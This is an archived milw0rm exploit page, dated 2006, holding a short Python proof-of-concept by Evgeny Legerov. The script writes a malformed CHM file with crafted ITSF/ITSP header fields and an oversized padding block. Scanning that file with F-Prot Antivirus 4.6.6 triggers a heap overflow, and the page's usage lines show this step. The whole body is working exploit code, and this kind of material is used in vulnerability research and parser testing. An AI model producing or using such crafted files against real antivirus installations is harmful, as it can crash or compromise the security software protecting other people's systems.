<html><head><title>F-Prot Antivirus 4.6.6 (CHM) Heap Overflow Exploit PoC</title></head><pre># fprot2.py - trivial proof of concept code for F-Prot 4.6.6 .CHM heap
# overflow
#
# Copyright (c) 2006 Evgeny Legerov
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED &quot;AS IS&quot; AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
#
# $ ./fprot2.py &gt; 1.chm
# $ f-prot 1.chm

import sys
import struct

s=&quot;&quot;
s+=&quot;ITSF&quot;        # signature
s+=struct.pack(&quot;&lt;L&quot;,3) # version
s+=struct.pack(&quot;&lt;L&quot;,96) # header_len
s+=struct.pack(&quot;&lt;L&quot;,1) # unknown
s+=struct.pack(&quot;&lt;L&quot;,0x41424344) # last_modified
s+=struct.pack(&quot;&lt;L&quot;,0x419) # lang_id
s+=&quot;A&quot;*16 #dir_clsid
s+=&quot;B&quot;*16 #stream_clsid
s+=struct.pack(&quot;&lt;L&quot;,96) + &quot;\x00&quot; * 4 #sec0_offset
s+=struct.pack(&quot;&lt;L&quot;,24) + &quot;\x00&quot; * 4 #sec0_len
s+=struct.pack(&quot;&lt;L&quot;,120) + &quot;\x00&quot; *4 #dir_offset
s+=struct.pack(&quot;&lt;L&quot;,4180) + &quot;\x00&quot; * 4 #dir_len
s+=struct.pack(&quot;&lt;L&quot;,4300) + &quot;\x00&quot;*4 #data_offset
s+=&quot;A&quot;*24
s+=&quot;ITSP&quot;
s+=struct.pack(&quot;&lt;L&quot;, 1) # version
s+=struct.pack(&quot;&lt;L&quot;,0x54) # header_len
s+=struct.pack(&quot;&lt;L&quot;, 0xa) # unknown
s+=struct.pack(&quot;&lt;L&quot;,1000) # block_len - BUG?
s+=struct.pack(&quot;&lt;L&quot;,2) # blockidx
s+=struct.pack(&quot;&lt;L&quot;, 1) # index_depth
s+=struct.pack(&quot;&lt;L&quot;, -1) # index_root
s+=struct.pack(&quot;&lt;L&quot;,0) # index_head
s+=struct.pack(&quot;&lt;L&quot;,0) # index_tail
s+=struct.pack(&quot;&lt;L&quot;, -1) # unknown2
s+=struct.pack(&quot;&lt;L&quot;,1) # num_blocks
s+=struct.pack(&quot;&lt;L&quot;, 1033) # lang_id
s+=&quot;A&quot;*32
s+=&quot;B&quot;*10000

sys.stdout.write(s)

# milw0rm.com [2006-12-04]</pre></html>